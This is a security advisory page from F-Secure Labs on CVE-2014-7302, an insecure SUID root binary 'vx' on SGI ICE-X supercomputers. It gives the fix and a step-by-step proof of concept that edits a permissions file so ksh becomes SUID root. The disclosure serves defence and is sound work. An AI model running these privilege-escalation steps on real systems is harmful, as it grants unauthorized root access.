<!DOCTYPE html>
<html lang="en-US">
<head>
    <base href="https://labs.f-secure.com/"><!--[if lte IE 6]></base><![endif]-->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<meta name="x-subsite-id" content="1" />

    <title>SGI SUID Root Privilege Escalation</title>

    <link rel="stylesheet" href="https://labs.f-secure.com/themes/mwr/css/style.css?t=20200715">
    <link rel="stylesheet" href="https://labs.f-secure.com/themes/labs/css/style.css?t=20200715">

    <meta name="description" content="">
    <link rel="canonical" href="https://labs.f-secure.com/advisories/sgi-suid-root-privilege-escalation/">
    <meta name="robots" content="NOODP,index,follow">

    

    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

    <meta name="format-detection" content="telephone=no">
    
    <meta property="og:title" content="">
    <meta property="og:description" content="">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="F-Secure Labs">
    <meta property="og:url" content="https://labs.f-secure.com/advisories/sgi-suid-root-privilege-escalation/">
    
    <meta property="og:locale" content='en_GB'>
    <meta name="twitter:card" content="summary">
    
    <meta name="twitter:title" content="">
    <meta name="twitter:description" content="">

  <script>
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});
    var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;
    j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})
    (window,document,'script','dataLayer','GTM-KD9T85H');
  </script>
  <meta name="google-site-verification" content="jqRTM8I_uI-jDIu1ITng14jD-3iJy0l3TTCIl2I-BIo" />
<link rel="stylesheet" type="text/css" href="/themes/labs/css/style.css?m=1600760392" />
</head>
<body class="BlogPost" dir="ltr">

    <header class="head menu-opened" id="top">
	<div class="container">
		<div class="col12">
			<div class="logo">
				<a href="/">F-Secure</a>
			</div>
		    <a href="/advisories/sgi-suid-root-privilege-escalation/#nav" class="btn-menu">Menu</a>

<nav class="main-nav" itemscope itemtype="https://schema.org/SiteNavigationElement">
    <ul>
        
            <li class="section nav-advisories"><a href="/advisories/" title="Advisories">Advisories</a></li>
        
            <li class="link nav-blog"><a href="/blog/" title="/var/log/messages">/var/log/messages</a></li>
        
            <li class="link nav-publications"><a href="/publications/" title="Publications">Publications</a></li>
        
            <li class="link nav-tools"><a href="/tools/" title="Tools">Tools</a></li>
        
            <li class="link nav-archive"><a href="/archive/" title="Archive">Archive</a></li>
        
        <li class="nav-careers"><a href="https://www.f-secure.com/en/web/about_global/careers/job-openings">Careers</a></li>
    </ul>
</nav>

		</div>
	</div>
</header>


    <div class="wrapper">

        <section class="section">
  <div class="page-title">
    <div class="container">
      <span class="content-type"></span>
      <h1>SGI SUID Root Privilege Escalation</h1>
      
      
    </div>
  </div>
</section>

<section class="section">
  <div class="container">
    <div class="col8">
      <div class="blog-post">
        
        <table>
          <tr>
            <td>Product</td>
            <td>SGI Tempo (SGI ICE-X Supercomputers)</td>
          </tr>
          <tr>
            <td>Severity</td>
            <td>Medium</td>
          </tr>
          <tr>
            <td>CVE Reference</td>
            <td>CVE-2014-7302</td>
          </tr>
          <tr>
            <td>Type</td>
            <td>SGI SUID Root Privilege Escalation</td>
          </tr>
        </table>
        
        <p>An insecure <span class="caps">SUID</span> root binary on <span class="caps">SGI</span> <span class="caps">ICE</span>-X supercomputers can be exploited by local users in order to escalate privileges to root.</p>
<dl><dt>Software</dt><dd><span class="caps">SGI</span> Tempo (<span class="caps">SGI</span> <span class="caps">ICE</span>-X Supercomputers)</dd><dt>Affected Versions</dt><dd>Unknown</dd><dt><span class="caps">CVE</span> Reference</dt><dd><span class="caps">CVE</span>-2014-7302</dd><dt>Authors</dt><dd>Luke Jennings, John Fitzpatrick <span class="caps">MWR</span> Labs</dd><dt>Severity</dt><dd>Medium Risk</dd><dt>Vendor</dt><dd>Silicon Graphics International Corp (<span class="caps">SGI</span>)</dd><dt>Vendor Response</dt><dd>Uncooperative</dd></dl><h3>Description</h3>
<p>A vulnerability exists which allows low privileged local users to escalate their privileges to root.</p>
<h3>Impact</h3>
<p>Successful exploitation provides full root access to the affected system.</p>
<h3>Cause</h3>
<p>An insecure <span class="caps">SUID</span> root binary (/opt/sgi/sgimc/bin/vx).</p>
<h3>Solution</h3>
<p>If removing the vx binary is not an option this issue can be resolved by altering the file permissions:</p>
<pre># chmod 755 /opt/sgi/sgimc/bin/vx</pre>
<p> </p>
<h3>Technical Details</h3>
<p>A <span class="caps">SUID</span> root binary, believed to be part of the <span class="caps">SGI</span> Management Center, exists on <span class="caps">SGI</span> <span class="caps">ICE</span>-X supercomputers and is insecurely configured allowing for low privileged users to escalate their privileges. This binary is shown below:</p>
<pre>$ ls -la /opt/sgi/sgimc/bin/vx
-rwsr-sr-x 1 root root 19248 2013-10-04 15:00 /opt/sgi/sgimc/bin/vx</pre>
<p><span class="caps">MWR</span> have only observed the vx binary on the admin nodes of <span class="caps">ICE</span>-X systems which are not typically accessible by non administrative users. If present on other nodes within the environment this issue should be considered a higher risk.</p>
<p>The output below shows the usage options available to users from the vx binary:</p>
<pre>user@sgi:~/test&gt; ./vx
Usage: vx -s[:&lt;scanlist&gt;] [-i:&lt;ignorelist&gt;] [&lt;entries&gt;]
       vx -x [&lt;entries&gt;]

Options:
-s     Scan the current directory or files listed in the specified file.
-i     Ignore the directories listed in the specified file.
-x     Extract files into the current directory.

NOTE: This program must be run directly or effectively as root.</pre>
<p>The “vx” binary provides a means to apply file permissions to all files within a directory allowing for file permissions to be preserved across nodes in an efficient fashion. However, the <span class="caps">SUID</span> permissions set on this binary mean that any user can execute it in a manner which allows the user to alter the permissions of any file, regardless of ownership, and even to arbitrarily change file permissions. It is therefore possible to utilise the vx binary to set <span class="caps">SUID</span> root permissions on arbitrary files from a low privileged user account and thus escalate privileges.</p>
<h3>Proof of Concept</h3>
<p>This proof of concept demonstrates how the insecure permissions on this file can be exploited in order to create a <span class="caps">SUID</span> root executable. The example will use the Korn shell (ksh) for simplicity, but could easily be refactored for other purposes.</p>
<p>For the purpose of this example the contents of the current working directory are:</p>
<pre>$ ls –la
drwxr-xr-x  3 j0hn users  4096 2014-09-01 14:42 .
drwxr-xr-x 13 j0hn users  4096 2014-09-01 14:42 ..
-rwxr-xr-x  1 j0hn users 38312 2014-09-01 14:30 ksh
-rwsr-sr-x  1 root root  19248 2014-08-19 19:41 vx</pre>
<p>Run the following command in order to scan the current directory and create a file named “mwrtestx” that contains information on the file permissions of all files within your current working directory:</p>
<pre>$ vx -s mwrtestx</pre>
<p>The file “mwrtestx” will be created with the following content:</p>
<pre>ksh^@f3wx92v53X3q3gB46FkQOX1^@5fat040116FkQOX1
vx^@f3S052Tt006bPnJX1^@5Wat040116ZtQOX1</pre>
<p>The file mwrtestx contains the file name, file permissions as well as ownership details. Therefore if the filename “vx” within this file is altered to read “ksh” the file contents now specify that the “ksh” binary be set the <span class="caps">SUID</span> root permissions currently applied to the “vx” binary:</p>
<pre>ksh^@f3S052Tt006bPnJX1^@5Wat040116ZtQOX1</pre>
<p>Executing the “vx” binary with the “mwrtestx” file results in the file permissions within the “mwrtestx” file being applied, in this case resulting in ksh being altered and made <span class="caps">SUID</span> root:</p>
<pre>$ vx -x mwrtestx</pre>
<p> </p>
<pre>$ ls –la
drwxr-xr-x  3 j0hn users  4096 2014-09-01 14:45 .
drwxr-xr-x 13 j0hn users  4096 2014-09-01 14:45 ..
-rwsr-sr-x  1 root root   38312 2014-08-19 19:41 ksh
-rwsr-sr-x  1 root root   19248 2014-08-19 19:41 vx</pre>
<p>To confirm that this has worked effectively ksh should be run:</p>
<pre>$ ./ksh
# id
uid=200107(j0hn) gid=16100(users) euid=0(root) egid=0(root) groups=16100(users)</pre>
<p> </p>
<h3>Detailed Timeline</h3>
<p><span class="caps">SGI</span> have chosen not to co-operate with <span class="caps">MWR</span> in the co-ordinated disclosure of this and other <span class="caps">SGI</span> related security issues. <span class="caps">MWR</span> are therefore unable to provide specific version information and other details. Whilst every effort has been made to ensure the accuracy and usefulness of this advisory it is recommend that <span class="caps">SGI</span> are contacted directly if further information is required.</p>
<table><tbody><tr><td>Date</td>
<td>Summary</td>
</tr><tr><td>2014-05-23</td>
<td>Contact with <span class="caps">SGI</span> attempted</td>
</tr><tr><td>2014-07-23</td>
<td>Contact with <span class="caps">SGI</span> re-attempted</td>
</tr><tr><td>2014-11-20</td>
<td>Contact with <span class="caps">SGI</span> re-attempted</td>
</tr><tr><td>2014-12-02</td>
<td>Advisory published</td>
</tr></tbody></table>
      </div>
      <div class="social-share">
        <p><span class="content-type">Share</span></p>
        <ul class="social">
  <li class="facebook"><a href="http://www.facebook.com/sharer.php?u=https://labs.f-secure.com/advisories/sgi-suid-root-privilege-escalation/" target="_blank">Share on Facebook</a></li>
  <li class="twitter"><a href="https://twitter.com/share?url=https://labs.f-secure.com/advisories/sgi-suid-root-privilege-escalation/&text=SGI SUID Root Privilege Escalation" target="_blank">Share on LinkedIn</a></li>
  <li class="linkedin"><a href="http://www.linkedin.com/shareArticle?url=https://labs.f-secure.com/advisories/sgi-suid-root-privilege-escalation/&title=SGI SUID Root Privilege Escalation" target="_blank">Share on Twitter</a></li>
</ul>

      </div>
    </div>
    <div class="col4">
      
      <a href="/assets/769/original/mwri_sgi-suid-privilege-escalation_2014-12-02.pdf" class="flex-container__box">
            <span class="content-type">Download</span>
            
            <h3 class="flex-container__box-title">Download the advisory here.</h3>
            
      </a>
      

      
    </div>
  </section>

  <section class="section">
    <div class="container">
      <div class="col12">
        <p>&nbsp;</p>
      </div>
    </div>
  </section>


    </div>

    <footer class="foot">
	<div class="container">
    <div class="footer-flex-wrap">
     <p class="logo"><img src="https://labs.f-secure.com//themes/labs/img/fs-labs-logo-white.svg" alt="F-Secure" width="180" height="60"></p>
      <ul class="top-menu">
        <li><a href="/advisories/sgi-suid-root-privilege-escalation/#top" class="btn-gototop">Top</a></li>
        
        <li class="link"><a href="https://www.f-secure.com/en/consulting/contact">Contact</a></li>
        
        
      </ul>
   </div>
   <hr/>
    <div class="col5 suf1 foot-about">
      <p>F-Secure provides specialist advice and solutions in all areas of cyber security, from professional and managed services, through to developing commercial and open source security tools.  </p>
    </div>
    <div class="col3">
      <ul class="footer-list no-margin">
        
        <li><a href="/publications/ti-report-lazarus-group-cryptocurrency-vertical/">Threat Intelligence Report: Lazarus Group Campaign Targeting the Cryptocurrency Vertical</a></li>
        
        <li><a href="/publications/the-fake-cisco/">The Fake Cisco</a></li>
        
        <li><a href="/publications/u-booting-securely/">U-Booting securely</a></li>
        
      </ul>
    </div>
    <div class="col3">
     <ul class="footer-list">
      
      <li><a href="/blog/prelude-to-ransomware-systembc/">Prelude to Ransomware: SystemBC</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-3/">Attack Detection Fundamentals 2021: Azure - Lab #3</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-2/">Attack Detection Fundamentals 2021: Azure - Lab #2</a></li>
      
    </ul>
  </div>
</div>
<div class="end">
 <div class="container">
  <hr/>
  <div class="footer-flex-wrap">
   <p class="copyright">Copyright &copy; 2021 F-Secure</p>
    <ul class="social">
      
      <li class="linkedin for-footer"><a href="https://www.linkedin.com/showcase/28493188" target="_blank">Connect with us on LinkedIn</a></li>
      
      
      <li class="twitter for-footer"><a href="https://twitter.com/fsecurelabs" target="_blank">Follow us on Twitter</a></li>
      
      
      <li class="github for-footer"><a href="https://github.com/fsecurelabs" target="_blank">Follow us on GitHub</a></li>
      
    </ul>
 </div>
</div>
</div>
</footer>

    <script src="/themes/mwr/js/min/jquery-3.5.1.min.js" id="jqueryscript"></script>

    
    <script src="/themes/mwr/js/min/slides.min.js"></script>
    

    <script src="/themes/mwr/js/min/scripts.js?20190917" id="pagescripts"></script>

    <script type="application/ld+json">
    { "@context" : "http://schema.org",
      "@type" : "Organization",
      "name" : "F-Secure Labs",
      "url" : "https://labs.f-secure.com",
      "logo" : "https://labs.f-secure.com/themes/labs/img/fs-labs-logo-white.svg",
      "sameAs" : [
          "https://twitter.com/fsecurelabs",
          "https://www.linkedin.com/showcase/28493188"],
      "contactPoint" : [
        { "@type" : "ContactPoint",
          "telephone" : "+441256300920",
          "contactType" : "customer service"
        } ]
    }
    </script>
</body>
</html>
